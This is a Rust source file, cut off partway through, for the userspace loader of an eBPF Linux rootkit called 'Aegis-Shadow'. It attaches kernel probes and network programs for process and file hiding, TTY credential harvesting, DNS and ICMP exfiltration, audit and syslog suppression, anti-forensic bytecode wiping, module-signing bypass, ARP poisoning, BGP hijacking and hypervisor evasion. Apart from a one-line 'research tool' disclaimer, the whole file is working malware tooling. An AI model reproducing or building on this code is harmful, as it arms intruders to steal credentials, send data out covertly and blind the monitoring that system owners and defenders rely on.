use anyhow::{Context, Result};
use aya::{
    include_bytes_aligned,
    maps::{HashMap, MapData, ProgramArray, RingBuf},
    programs::{
        tc::{SchedClassifier, TcAttachType},
        KProbe, TracePoint, Xdp, XdpFlags,
    },
    Btf, Ebpf,
};
use aya_log::EbpfLogger;
use clap::Parser;
use common::{
    CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig, TimestompEntry,
    BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_ARP_POISONED,
    EVENT_AUDIT_KILLED, EVENT_BGP_HIJACK, EVENT_BPF_CLOAKED, EVENT_BPF_ITER_ABUSED,
    EVENT_BPF_LINK_PINNED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE,
    EVENT_COREDUMP_SUPPRESSED, EVENT_CRED_RELAYED, EVENT_DNS_EXFIL, EVENT_DR_BREAKPOINT,
    EVENT_FILE_OBFUSCATED, EVENT_FTRACE_BLINDED, EVENT_ICMP_EXFIL, EVENT_INITRAMFS_IMPLANT,
    EVENT_INODE_SLACK_HIDE, EVENT_IPV6_EXT_ABUSE, EVENT_ISN_COVERT, EVENT_JOURNAL_MANIPULATED,
    EVENT_KALLSYMS_HIDDEN, EVENT_KPROBE_DETECTED, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED,
    EVENT_MODSIGN_BYPASS, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED,
    EVENT_PMC_COVERT, EVENT_PORT_KNOCK_AUTH, EVENT_PROC_DEEP_SPOOF, EVENT_PROC_HIDDEN,
    EVENT_SHM_COVERT_MSG, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED, EVENT_TAIL_CALL_CHAIN,
    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED, EVENT_TSC_SIDECHAN, EVENT_UFFD_INJECTION,
    EVENT_VDSO_HOOKED,
};
use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, Mutex};
use tokio::io::unix::AsyncFd;
use tokio::signal;
use tokio::sync::watch;
use tracing::{debug, error, info, warn};

type IcmpExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>;
type DnsExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>;

#[derive(Debug, Parser)]
#[command(name = "aegis-shadow-offense")]
#[command(about = "Aegis-Shadow Offensive Rootkit Loader", long_about = None)]
struct Cli {
    /// Network interface to attach XDP program
    #[arg(short, long, default_value = "eth0")]
    iface: String,

    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,

    /// Hide specific PID on startup
    #[arg(long)]
    hide_pid: Option<u32>,

    /// Obfuscate file by inode
    #[arg(long)]
    obfuscate_inode: Option<u64>,

    /// Monitor TTY device (major:minor format, e.g., 136:0)
    #[arg(long)]
    monitor_tty: Option<String>,

    /// Spoof PPID for target PID (format: pid:fake_ppid)
    #[arg(long)]
    spoof_ppid: Option<String>,

    /// Mark inode for timestomping (format: inode:atime:mtime:ctime)
    #[arg(long)]
    timestomp: Option<String>,

    /// Pin BPF maps to filesystem for persistence
    #[arg(long)]
    pin_maps: bool,

    /// Enable network namespace hiding (intercepts setns)
    #[arg(long)]
    enable_netns_hide: bool,

    /// Enable eBPF program cloaking (hides own prog IDs)
    #[arg(long)]
    enable_bpf_cloak: bool,

    /// Enable kernel module masquerading (/proc/modules)
    #[arg(long)]
    enable_module_mask: bool,

    /// Enable memory-only payload staging (memfd_create + execveat)
    #[arg(long)]
    enable_memfd: bool,

    /// Enable syslog write stripping
    #[arg(long)]
    enable_syslog_strip: bool,

    /// Activate bytecode wipe (programs become no-ops for anti-forensics)
    #[arg(long)]
    wipe_bytecode: bool,

    /// Enable ICMP covert channel exfiltration
    #[arg(long)]
    enable_icmp_exfil: bool,

    /// Enable socket cloning / connection shadowing
    #[arg(long)]
    enable_socket_clone: bool,

    /// Enable credential relay over C2
    #[arg(long)]
    enable_cred_relay: bool,

    /// Enable container escape probes
    #[arg(long)]
    enable_container_probe: bool,

    /// Enable kprobe detection & evasion (F25)
    #[arg(long)]
    enable_kprobe_evasion: bool,

    /// Enable eBPF tail-call chains (F26)
    #[arg(long)]
    enable_tail_calls: bool,

    /// Enable ftrace/perf event blinding (F27)
    #[arg(long)]
    enable_ftrace_blind: bool,

    /// Enable BPF iterator abuse (F28)
    #[arg(long)]
    enable_bpf_iter_abuse: bool,

    /// Enable VDSO/vsyscall hooking (F29)
    #[arg(long)]
    enable_vdso_hook: bool,

    /// Enable shared memory covert channel (F30)
    #[arg(long)]
    enable_shm_covert: bool,

    /// Enable userfaultfd process injection (F31)
    #[arg(long)]
    enable_uffd_inject: bool,

    /// Enable core dump suppression (F32)
    #[arg(long)]
    enable_coredump_suppress: bool,

    /// Enable TCP ISN covert channel (F33)
    #[arg(long)]
    enable_isn_covert: bool,

    /// Enable IPv6 extension header abuse (F34)
    #[arg(long)]
    enable_ipv6_ext: bool,

    /// Enable ARP cache poisoning (F35)
    #[arg(long)]
    enable_arp_poison: bool,

    /// Enable XDP port knocking daemon (F36)
    #[arg(long)]
    enable_port_knock: bool,

    /// Enable BGP hijacking (F37)
    #[arg(long)]
    enable_bgp_hijack: bool,

    /// Enable hardware breakpoint (DR register) abuse (F38)
    #[arg(long)]
    enable_dr_abuse: bool,

    /// Enable CPU performance counter covert channel (F39)
    #[arg(long)]
    enable_pmc_covert: bool,

    /// Enable TSC timing side channel (F40)
    #[arg(long)]
    enable_tsc_sidechan: bool,

    /// Enable audit subsystem kill (F41)
    #[arg(long)]
    enable_audit_kill: bool,

    /// Enable inode slack-space hiding (F42)
    #[arg(long)]
    enable_inode_slack: bool,

    /// Enable ext4 journal manipulation (F43)
    #[arg(long)]
    enable_journal_manip: bool,

    /// Enable /proc deep spoofing (F44)
    #[arg(long)]
    enable_proc_spoof: bool,

    /// Enable initramfs implant detection (F45)
    #[arg(long)]
    enable_initramfs: bool,

    /// Enable kernel module signing bypass (F46)
    #[arg(long)]
    enable_modsign_bypass: bool,

    /// Enable BPF link pinning with obfuscated paths (F47)
    #[arg(long)]
    enable_bpf_obf_pin: bool,

    /// Enable hypervisor-aware evasion (F48-F51)
    #[arg(long)]
    enable_hypervisor_evasion: bool,

    /// Enable polymorphic/self-rewriting bytecode (F52-F54)
    #[arg(long)]
    enable_polymorphic: bool,

    /// Enable phantom TCP stack in XDP/TC (F55-F57)
    #[arg(long)]
    enable_phantom_stack: bool,

    /// Enable cross-container lateral movement (F58-F60)
    #[arg(long)]
    enable_container_lateral: bool,

    /// Enable DMA/PCIe covert channels (F61-F63)
    #[arg(long)]
    enable_dma_covert: bool,

    /// Enable AI-driven behavioral camouflage (F64-F66)
    #[arg(long)]
    enable_behavioral_ai: bool,

    /// Enable supply chain persistence hooks (F67-F69)
    #[arg(long)]
    enable_supply_chain: bool,

    /// Enable dead man's switch heartbeat monitor (F70-F72)
    #[arg(long)]
    enable_deadman_switch: bool,

    /// Enable BPF-to-BPF parasitism (F73-F75)
    #[arg(long)]
    enable_bpf_parasitism: bool,
}

struct C2Maps {
    hidden_pids: Mutex<HashMap<MapData, u32, u8>>,
    obfuscate_inodes: Mutex<HashMap<MapData, u64, u8>>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| {
                tracing_subscriber::EnvFilter::new(if cli.verbose { "debug" } else { "info" })
            }),
        )
        .with_target(false)
        .init();

    // Bump the memlock rlimit for eBPF
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        warn!("Failed to increase RLIMIT_MEMLOCK");
    }

    info!("🔥 Aegis-Shadow Offensive Rootkit Starting...");
    info!("⚠️  WARNING: This is a research tool. Use responsibly and legally.");

    // Load eBPF bytecode
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/debug/offense"
    ))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/offense"
    ))?;

    // Load BTF if available
    if Btf::from_sys_fs().is_ok() {
        info!("✓ BTF loaded from /sys/kernel/btf/vmlinux");
    } else {
        warn!("⚠ BTF not available - CO-RE features may not work");
    }

    // Initialize BPF logger
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        warn!("Failed to initialize eBPF logger: {}", e);
    }

    // Configure rootkit
    let self_pid = std::process::id();
    let config = RootkitConfig {
        self_pid,
        hide_procs: 1,
        net_stealth: 1,
        file_obfuscate: 1,
        mute_telemetry: 1,
        _pad: [0u8; 4],
    };

    let mut config_map: HashMap<_, u32, RootkitConfig> =
        HashMap::try_from(bpf.map_mut("CONFIG").context("CONFIG map not found")?)?;
    config_map.insert(0u32, config, 0)?;
    info!("✓ Rootkit configured (self_pid={})", self_pid);

    // Pin maps if requested
    if cli.pin_maps {
        pin_all_maps(&mut bpf)?;
        info!("✓ Maps pinned to {}", BPF_PIN_PATH);
    }

    // Load Feature 1: Process Hiding (getdents64)
    let getdents_enter: &mut KProbe = bpf
        .program_mut("shadow_getdents64_enter")
        .context("shadow_getdents64_enter not found")?
        .try_into()?;
    getdents_enter.load()?;
    getdents_enter.attach("__x64_sys_getdents64", 0)?;

    let getdents_exit: &mut KProbe = bpf
        .program_mut("shadow_getdents64_exit")
        .context("shadow_getdents64_exit not found")?
        .try_into()?;
    getdents_exit.load()?;
    getdents_exit.attach("__x64_sys_getdents64", 0)?;
    info!("✓ Feature 1: Process Hiding (getdents64) loaded");

    // Load Feature 2: Network Stealth (XDP)
    let xdp_prog: &mut Xdp = bpf
        .program_mut("shadow_xdp")
        .context("shadow_xdp not found")?
        .try_into()?;
    xdp_prog.load()?;
    xdp_prog.attach(&cli.iface, XdpFlags::default())?;
    info!(
        "✓ Feature 2: Network Stealth (XDP) attached to {}",
        cli.iface
    );

    // Load Feature 3: File Obfuscation (vfs_read)
    let vfs_read: &mut KProbe = bpf
        .program_mut("shadow_vfs_read")
        .context("shadow_vfs_read not found")?
        .try_into()?;
    vfs_read.load()?;
    vfs_read.attach("vfs_read", 0)?;
    info!("✓ Feature 3: File Obfuscation (vfs_read) loaded");

    // Load Feature 4: Telemetry Muting (audit hooks)
    let audit_syscall: &mut KProbe = bpf
        .program_mut("shadow_mute_audit")
        .context("shadow_mute_audit not found")?
        .try_into()?;
    audit_syscall.load()?;
    if let Err(e) = audit_syscall.attach("audit_log_start", 0) {
        warn!(
            "⚠ Failed to attach audit_log_start: {} (audit may not be enabled)",
            e
        );
    } else {
        info!("✓ Feature 4: Telemetry Muting (audit) loaded");
    }

    let audit_log_end: &mut KProbe = bpf
        .program_mut("shadow_mute_audit_log_end")
        .context("shadow_mute_audit_log_end not found")?
        .try_into()?;
    audit_log_end.load()?;
    if let Err(e) = audit_log_end.attach("audit_log_end", 0) {
        warn!("⚠ Failed to attach audit_log_end: {}", e);
    }

    // Load Feature 6: Credential Harvesting (sys_write on TTY)
    let cred_harvest: &mut KProbe = bpf
        .program_mut("shadow_cred_harvest")
        .context("shadow_cred_harvest not found")?
        .try_into()?;
    cred_harvest.load()?;
    cred_harvest.attach("ksys_write", 0)?;
    info!("✓ Feature 6: Credential Harvesting (ksys_write) loaded");

    // Load Feature 7: Log Tampering (do_syslog)
    let log_tamper_enter: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs_enter")
        .context("shadow_tamper_logs_enter not found")?
        .try_into()?;
    log_tamper_enter.load()?;
    log_tamper_enter.attach("do_syslog", 0)?;

    let log_tamper_exit: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs")
        .context("shadow_tamper_logs not found")?
        .try_into()?;
    log_tamper_exit.load()?;
    log_tamper_exit.attach("do_syslog", 0)?;
    info!("✓ Feature 7: Log Tampering (do_syslog) loaded");

    // Load Feature 8: Process Ancestry Spoofing (vfs_read on /proc/[pid]/status)
    let spoof_ancestry: &mut KProbe = bpf
        .program_mut("shadow_spoof_ancestry")
        .context("shadow_spoof_ancestry not found")?
        .try_into()?;
    spoof_ancestry.load()?;
    spoof_ancestry.attach("vfs_read", 0)?;
    info!("✓ Feature 8: Process Ancestry Spoofing (vfs_read) loaded");

    // Load Feature 9: DNS Exfiltration (TC egress)
    let tc_prog: &mut SchedClassifier = bpf
        .program_mut("shadow_dns_exfil")
        .context("shadow_dns_exfil not found")?
        .try_into()?;
    tc_prog.load()?;
    tc_prog.attach(&cli.iface, TcAttachType::Egress)?;
    info!(
        "✓ Feature 9: DNS Exfiltration (TC egress) attached to {}",
        cli.iface
    );

    // Load Feature 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
    let hide_kallsyms: &mut KProbe = bpf
        .program_mut("shadow_hide_kallsyms")
        .context("shadow_hide_kallsyms not found")?
        .try_into()?;
    hide_kallsyms.load()?;
    hide_kallsyms.attach("vfs_read", 0)?;
    info!("✓ Feature 10: Kallsyms Hiding (vfs_read) loaded");

    // Load Feature 11: Anti-Detach Self-Defense (bpf tracepoint)
    let anti_detach: &mut TracePoint = bpf
        .program_mut("shadow_anti_detach")
        .context("shadow_anti_detach not found")?
        .try_into()?;
    anti_detach.load()?;
    anti_detach.attach("syscalls", "sys_enter_bpf")?;
    info!("✓ Feature 11: Anti-Detach Self-Defense (tracepoint) loaded");

    // Load Feature 13: Timestomping (vfs_getattr)
    let timestomp_enter: &mut KProbe = bpf
        .program_mut("shadow_timestomp_enter")
        .context("shadow_timestomp_enter not found")?
        .try_into()?;
    timestomp_enter.load()?;
    timestomp_enter.attach("vfs_getattr", 0)?;

    let timestomp_exit: &mut KProbe = bpf
        .program_mut("shadow_timestomp")
        .context("shadow_timestomp not found")?
        .try_into()?;
    timestomp_exit.load()?;
    timestomp_exit.attach("vfs_getattr", 0)?;
    info!("✓ Feature 13: Timestomping (vfs_getattr) loaded");

    // ── New Feature Loading (gated by CLI flags) ──

    // Feature 14: Network Namespace Hiding
    if cli.enable_netns_hide {
        let setns_enter: &mut KProbe = bpf
            .program_mut("shadow_setns_enter")
            .context("shadow_setns_enter not found")?
            .try_into()?;
        setns_enter.load()?;
        setns_enter.attach("__x64_sys_setns", 0)?;
        info!("✓ Feature 14: Network Namespace Hiding loaded");
    }

    // Feature 15: eBPF Program Cloaking
    if cli.enable_bpf_cloak {
        let bpf_enter: &mut KProbe = bpf
            .program_mut("shadow_bpf_enter")
            .context("shadow_bpf_enter not found")?
            .try_into()?;
        bpf_enter.load()?;
        bpf_enter.attach("__x64_sys_bpf", 0)?;

        let bpf_exit: &mut KProbe = bpf
            .program_mut("shadow_bpf_exit")
            .context("shadow_bpf_exit not found")?
            .try_into()?;
        bpf_exit.load()?;
        bpf_exit.attach("__x64_sys_bpf", 0)?;
        info!("✓ Feature 15: eBPF Program Cloaking loaded");
    }

    // Feature 16: Kernel Module Masquerading
    if cli.enable_module_mask {
        let modules_enter: &mut KProbe = bpf
            .program_mut("shadow_modules_read_enter")
            .context("shadow_modules_read_enter not found")?
            .try_into()?;
        modules_enter.load()?;
        modules_enter.attach("vfs_read", 0)?;

        let modules_exit: &mut KProbe = bpf
            .program_mut("shadow_modules_read_exit")
            .context("shadow_modules_read_exit not found")?
            .try_into()?;
        modules_exit.load()?;
        modules_exit.attach("vfs_read", 0)?;
        info!("✓ Feature 16: Kernel Module Masquerading loaded");
    }

    // Feature 17: Memory-Only Payload Staging
    if cli.enable_memfd {
        let memfd_enter: &mut KProbe = bpf
            .program_mut("shadow_memfd_create_enter")
            .context("shadow_memfd_create_enter not found")?
            .try_into()?;
        memfd_enter.load()?;
        memfd_enter.attach("__x64_sys_memfd_create", 0)?;

        let memfd_exit: &mut KProbe = bpf
            .program_mut("shadow_memfd_create_exit")
            .context("shadow_memfd_create_exit not found")?
            .try_into()?;
        memfd_exit.load()?;
        memfd_exit.attach("__x64_sys_memfd_create", 0)?;

        let execveat: &mut KProbe = bpf
            .program_mut("shadow_execveat_enter")
            .context("shadow_execveat_enter not found")?
            .try_into()?;
        execveat.load()?;
        execveat.attach("do_execveat_common", 0)?;
        info!("✓ Feature 17: Memory-Only Payload Staging loaded");
    }

    // Feature 18: Syslog Write Stripping
    if cli.enable_syslog_strip {
        let syslog_write: &mut KProbe = bpf
            .program_mut("shadow_syslog_write")
            .context("shadow_syslog_write not found")?
            .try_into()?;
        syslog_write.load()?;
        syslog_write.attach("ksys_write", 0)?;
        info!("✓ Feature 18: Syslog Write Stripping loaded");
    }

    // Feature 19: Anti-Forensics Bytecode Wipe
    {
        let wipe_check: &mut KProbe = bpf
            .program_mut("shadow_wipe_check")
            .context("shadow_wipe_check not found")?
            .try_into()?;
        wipe_check.load()?;
        wipe_check.attach("__x64_sys_getpid", 0)?;
        if cli.wipe_bytecode {
            let mut wipe_flag: HashMap<_, u32, u32> = HashMap::try_from(
                bpf.map_mut("WIPE_FLAG")
                    .context("WIPE_FLAG map not found")?,
            )?;
            wipe_flag.insert(0u32, 1u32, 0)?;
            info!("✓ Feature 19: Bytecode Wipe ACTIVATED — programs are now no-ops");
        }
    }

    // Feature 20: ICMP Covert Channel
    if cli.enable_icmp_exfil {
        let icmp_prog: &mut SchedClassifier = bpf
            .program_mut("shadow_icmp_exfil")
            .context("shadow_icmp_exfil not found")?
            .try_into()?;
        icmp_prog.load()?;
        icmp_prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!(
            "✓ Feature 20: ICMP Covert Channel (TC egress) attached to {}",
            cli.iface
        );
    }

    // Feature 21: Socket Cloning
    if cli.enable_socket_clone {
        let tcp_sendmsg: &mut KProbe = bpf
            .program_mut("shadow_tcp_sendmsg")
            .context("shadow_tcp_sendmsg not found")?
            .try_into()?;
        tcp_sendmsg.load()?;
        tcp_sendmsg.attach("tcp_sendmsg", 0)?;
        info!("✓ Feature 21: Socket Cloning (tcp_sendmsg) loaded");
    }

    // Feature 23: Container Escape Probes
    if cli.enable_container_probe {
        let unshare: &mut KProbe = bpf
            .program_mut("shadow_unshare_enter")
            .context("shadow_unshare_enter not found")?
            .try_into()?;
        unshare.load()?;
        unshare.attach("__x64_sys_unshare", 0)?;

        let commit_creds: &mut KProbe = bpf
            .program_mut("shadow_commit_creds")
            .context("shadow_commit_creds not found")?
            .try_into()?;
        commit_creds.load()?;
        commit_creds.attach("commit_creds", 0)?;
        info!("✓ Feature 23: Container Escape Probes loaded");
    }

    // ── Feature 25: Kprobe Detection & Evasion ──
    if cli.enable_kprobe_evasion {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_register_kprobe")
            .context("shadow_register_kprobe not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("register_kprobe", 0)?;
        info!("✓ Feature 25: Kprobe Detection & Evasion attached");
    }

    // ── Feature 26: eBPF Tail-Call Chains ──
    if cli.enable_tail_calls {
        let stage1: &mut KProbe = bpf
            .program_mut("shadow_tail_chain_stage1")
            .context("shadow_tail_chain_stage1 not found")?
            .try_into()?;
        stage1.load()?;
        let stage2: &mut KProbe = bpf
            .program_mut("shadow_tail_chain_stage2")
            .context("shadow_tail_chain_stage2 not found")?
            .try_into()?;
        stage2.load()?;
        let entry: &mut KProbe = bpf
            .program_mut("shadow_tail_chain_entry")
            .context("shadow_tail_chain_entry not found")?
            .try_into()?;
        entry.load()?;
        entry.attach("__x64_sys_getpid", 0)?;
        let mut tail_progs = ProgramArray::try_from(
            bpf.take_map("TAIL_CALL_PROGS")
                .context("TAIL_CALL_PROGS not found")?,
        )?;
        let fd0 = bpf.program("shadow_tail_chain_stage1").unwrap().fd()?;
        tail_progs.set(0, fd0, 0)?;
        let fd1 = bpf.program("shadow_tail_chain_stage2").unwrap().fd()?;
        tail_progs.set(1, fd1, 0)?;
        info!("✓ Feature 26: eBPF Tail-Call Chains loaded");
    }

    // ── Feature 27: Ftrace/Perf Event Blinding ──
    if cli.enable_ftrace_blind {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_perf_event_open")
            .context("shadow_perf_event_open not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("perf_event_open", 0)?;
        info!("✓ Feature 27: Ftrace/Perf Event Blinding attached");
    }

    // ── Feature 28: BPF Iterator Abuse ──
    if cli.enable_bpf_iter_abuse {
        let enter: &mut KProbe = bpf
            .program_mut("shadow_bpf_iter_run_enter")
            .context("shadow_bpf_iter_run_enter not found")?
            .try_into()?;
        enter.load()?;
        enter.attach("bpf_iter_run_prog", 0)?;
        let exit: &mut KProbe = bpf
            .program_mut("shadow_bpf_iter_run_exit")
            .context("shadow_bpf_iter_run_exit not found")?
            .try_into()?;
        exit.load()?;
        exit.attach("bpf_iter_run_prog", 0)?;
        info!("✓ Feature 28: BPF Iterator Abuse attached");
    }

    // ── Feature 29: VDSO/Vsyscall Hooking ──
    if cli.enable_vdso_hook {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_vdso_setup")
            .context("shadow_vdso_setup not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("arch_setup_additional_pages", 0)?;
        info!("✓ Feature 29: VDSO/Vsyscall Hooking attached");
    }

    // ── Feature 30: Shared Memory Covert Channel ──
    if cli.enable_shm_covert {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_shmat_enter")
            .context("shadow_shmat_enter not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("do_shmat", 0)?;
        info!("✓ Feature 30: Shared Memory Covert Channel attached");
    }

    // ── Feature 31: Userfaultfd Process Injection ──
    if cli.enable_uffd_inject {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_uffd_ioctl")
            .context("shadow_uffd_ioctl not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("userfaultfd_ioctl", 0)?;
        info!("✓ Feature 31: Userfaultfd Process Injection attached");
    }

    // ── Feature 32: Core Dump Suppression ──
    if cli.enable_coredump_suppress {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_do_coredump")
            .context("shadow_do_coredump not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("do_coredump", 0)?;
        info!("✓ Feature 32: Core Dump Suppression attached");
    }

    // ── Feature 33: TCP ISN Covert Channel (TC egress) ──
    if cli.enable_isn_covert {
        let prog: &mut SchedClassifier = bpf
            .program_mut("shadow_isn_covert")
            .context("shadow_isn_covert not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!(
            "✓ Feature 33: TCP ISN Covert Channel attached to {}",
            cli.iface
        );
    }

    // ── Feature 34: IPv6 Extension Header Abuse (TC egress) ──
    if cli.enable_ipv6_ext {
        let prog: &mut SchedClassifier = bpf
            .program_mut("shadow_ipv6_ext_abuse")
            .context("shadow_ipv6_ext_abuse not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!(
            "✓ Feature 34: IPv6 Extension Header Abuse attached to {}",
            cli.iface
        );
    }

    // ── Feature 35: ARP Cache Poisoning (XDP) ──
    if cli.enable_arp_poison {
        let prog: &mut Xdp = bpf
            .program_mut("shadow_arp_poison")
            .context("shadow_arp_poison not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, XdpFlags::default())?;
        info!(
            "✓ Feature 35: ARP Cache Poisoning attached to {}",
            cli.iface
        );
    }

    // ── Feature 36: XDP Port Knocking Daemon ──
    if cli.enable_port_knock {
        let prog: &mut Xdp = bpf
            .program_mut("shadow_port_knock")
            .context("shadow_port_knock not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, XdpFlags::default())?;
        info!("✓ Feature 36: XDP Port Knocking attached to {}", cli.iface);
    }

    // ── Feature 37: BGP Hijacking (TC egress) ──
    if cli.enable_bgp_hijack {
        let prog: &mut SchedClassifier = bpf
            .program_mut("shadow_bgp_hijack")
            .context("shadow_bgp_hijack not found")?
            .try_into()?;
        prog.load()?;
        prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!("✓ Feature 37: BGP Hijacking attached to {}", cli.iface);
    }

    // ── Feature 38: Hardware Breakpoint (DR Register) Abuse ──
    if cli.enable_dr_abuse {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_hw_breakpoint_install")
            .context("shadow_hw_breakpoint_install not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("arch_install_hw_breakpoint", 0)?;
        info!("✓ Feature 38: Hardware Breakpoint Abuse attached");
    }

    // ── Feature 39: CPU Performance Counter Covert Channel ──
    if cli.enable_pmc_covert {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_perf_event_read_ret")
            .context("shadow_perf_event_read_ret not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("perf_event_read", 0)?;
        info!("✓ Feature 39: PMC Covert Channel attached");
    }

    // ── Feature 40: TSC Timing Side Channel ──
    if cli.enable_tsc_sidechan {
        let enter: &mut KProbe = bpf
            .program_mut("shadow_tsc_check_enter")
            .context("shadow_tsc_check_enter not found")?
            .try_into()?;
        enter.load()?;
        enter.attach("crypto_skcipher_encrypt", 0)?;
        let exit: &mut KProbe = bpf
            .program_mut("shadow_tsc_check_exit")
            .context("shadow_tsc_check_exit not found")?
            .try_into()?;
        exit.load()?;
        exit.attach("crypto_skcipher_encrypt", 0)?;
        info!("✓ Feature 40: TSC Timing Side Channel attached");
    }

    // ── Feature 41: Audit Subsystem Kill ──
    if cli.enable_audit_kill {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_audit_receive_msg")
            .context("shadow_audit_receive_msg not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("audit_receive_msg", 0)?;
        info!("✓ Feature 41: Audit Subsystem Kill attached");
    }

    // ── Feature 42: Inode Slack-Space Hiding ──
    if cli.enable_inode_slack {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_vfs_write_slack")
            .context("shadow_vfs_write_slack not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("vfs_write", 0)?;
        info!("✓ Feature 42: Inode Slack-Space Hiding attached");
    }

    // ── Feature 43: Ext4 Journal Manipulation ──
    if cli.enable_journal_manip {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_journal_commit")
            .context("shadow_journal_commit not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("jbd2_journal_commit_transaction", 0)?;
        info!("✓ Feature 43: Ext4 Journal Manipulation attached");
    }

    // ── Feature 44: /proc Deep Spoofing ──
    if cli.enable_proc_spoof {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_seq_read_enter")
            .context("shadow_seq_read_enter not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("seq_read", 0)?;
        info!("✓ Feature 44: /proc Deep Spoofing attached");
    }

    // ── Feature 45: Initramfs Implant ──
    if cli.enable_initramfs {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_init_module")
            .context("shadow_init_module not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("init_module", 0)?;
        info!("✓ Feature 45: Initramfs Implant attached");
    }

    // ── Feature 46: Kernel Module Signing Bypass ──
    if cli.enable_modsign_bypass {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_module_sig_check")
            .context("shadow_module_sig_check not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("module_sig_check", 0)?;
        info!("✓ Feature 46: Module Signing Bypass attached");
    }

    // ── Feature 47: BPF Link Pinning with Obfuscated Paths ──
    if cli.enable_bpf_obf_pin {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_bpf_obj_get")
            .context("shadow_bpf_obj_get not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("bpf_obj_get", 0)?;
        info!("✓ Feature 47: BPF Link Pinning attached");
    }

    // ── Features 48-51: Hypervisor Evasion ──
    if cli.enable_hypervisor_evasion {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_cpuid_intercept")
            .context("shadow_cpuid_intercept not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("kvm_emulate_cpuid", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_hypercall_detect")
            .context("shadow_hypercall_detect not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("kvm_hypercall", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_nmi_handler")
            .context("shadow_nmi_handler not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("exc_nmi", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_tsc_khz_changed")
            .context("shadow_tsc_khz_changed not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("tsc_khz_changed", 0)?;
        info!("✓ Features 48-51: Hypervisor Evasion attached");
    }

    // ── Features 52-54: Polymorphic Engine ──
    if cli.enable_polymorphic {
        let prog: &mut KProbe = bpf
            .program_mut("shadow_bpf_prog_morph")
            .context("shadow_bpf_prog_morph not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("bpf_prog_load", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_pattern_rotate")
            .context("shadow_pattern_rotate not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("__schedule", 0)?;

        let prog: &mut KProbe = bpf
            .program_mut("shadow_opaque_predicate")
            .context("shadow_opaque_predicate not found")?
            .try_into()?;
        prog.load()?;
        prog.attach("bpf_check", 0)?;
        info!("✓ Features 52-54: Polymorphic Engine attached");
    }

    // ── Features 55-57: Phantom Network Stack ──
    if cli.enable_phantom_stack {
        let prog: &mut Xdp = bpf
            .program_mut("shadow_phantom_ingress")
